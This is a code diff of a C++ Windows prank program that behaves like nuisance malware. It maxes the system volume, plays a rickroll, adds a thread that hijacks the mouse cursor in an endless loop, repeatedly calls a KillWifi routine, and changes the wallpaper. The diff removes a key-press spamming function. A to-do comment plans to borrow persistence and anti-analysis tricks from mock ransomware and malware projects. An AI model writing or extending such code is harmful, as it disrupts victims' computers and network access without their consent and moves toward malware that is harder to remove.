@@ -8,13 +8,13 @@
 #include <WinInet.h> // Req header for wallpaper-set function
 #include <ShlObj.h> // Reg header for wallpaper-set objects
 #include <cmath> // For exponential character output
-#include <time.h>
+#include <time.h> // For initial random seeding 
 #include <corecrt_wstring.h>
-#include <curl/curl.h>
-#include <stdio.h>
+#include <curl/curl.h> // For downloading files from internet sources
+#include <stdio.h> // Debug printouts
 #include <direct.h>
-#include <endpointvolume.h>
-#include <mmdeviceapi.h>
+#include <endpointvolume.h> // Dont think we need this anymore
+#include <mmdeviceapi.h> // For playing audio through the microsoft's media service
 #include <string>
 #include <iostream>
 #define GetCurrentDir _getcwd
@@ -168,23 +168,6 @@ int KillWifi() {
 	return 0; // ends function
 }
 
-int KeyPress() {
-	INPUT ip; // Initializes input object
-	ip.type = INPUT_KEYBOARD;
-	ip.ki.wScan = 0;
-	ip.ki.time = 0;
-	ip.ki.dwExtraInfo = 0;
-
-	ip.ki.wVk = 0x41; // Key code for 'a' key (can change this so is random?)
-	ip.ki.dwFlags = 0;
-	SendInput(1, &ip, sizeof(INPUT)); // Presses the 'a' key
-
-	ip.ki.dwFlags = KEYEVENTF_KEYUP;
-	SendInput(1, &ip, sizeof(INPUT)); // Releases key
-
-	return 0;
-}
-
 size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
 	size_t written;
 	written = fwrite(ptr, size, nmemb, stream);
@@ -238,21 +221,28 @@ DWORD WINAPI SongPlayin(LPVOID lpparameter) {
 
 }
 
+DWORD WINAPI troll_the_mouse(LPVOID args) {
+	while (true)
+	{
+		MoveCursor();
+	}
+}
+
 //int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) // make sure to change this back after debug
 int main()
 {
-
 	MaxVol();
-	return 0; // debug output
-
-
+	
+	HANDLE mouseThread = CreateThread(0, 0, troll_the_mouse, NULL, 0, 0);
 
 	bool done = false;
-	HANDLE thread = CreateThread(0, 0, SongPlayin, reinterpret_cast<void*>(&done), 0, 0); // Plays song (rickroll as of right now)
-	//while (!done) {
-	//	Sleep(1000);
-	//}
-	//CloseHandle(thread);
+	HANDLE audioThread = CreateThread(0, 0, SongPlayin, reinterpret_cast<void*>(&done), 0, 0); // Plays song (rickroll as of right now)
+	while (!done) {
+		Sleep(1000);
+	}
+	CloseHandle(audioThread);
+	CloseHandle(mouseThread);
+	return 0; // debug output
 
 
 	int count = 0;
@@ -275,6 +265,7 @@ int main()
 	//LPCWSTR fin = cC;
 	SetWallpaper((LPCWSTR) cCurrentPath);
 
+	
 	while (count < 1000) { // # of reps
 		int v1 = 1;
 		if (v1) {
@@ -282,9 +273,6 @@ int main()
 		}
 		KillWifi();
 		count++;
-		for (int i = 1; i < pow(count + 1, 2); i++) {
-			KeyPress();
-		}
 		Sleep(2000); // Wait time
 	}
 	
@@ -303,5 +291,8 @@ int main()
 		2. Project type change note
 		https://stackoverflow.com/questions/6626397/error-lnk2019-unresolved-external-symbol-winmain16-referenced-in-function#8532797
 
-		3. Modify KeyPress function to randomly choose timing and what key gets pressed
+		3. Check out persistence and defensive methods from this mock ransomware and this mock malware
+			https://github.com/ryancor/mock-ransomware/blob/master/ransomware/ransomware/anti_checks.cpp
+			http://www.rohitab.com/discuss/topic/25977-malware-c/
+
 */
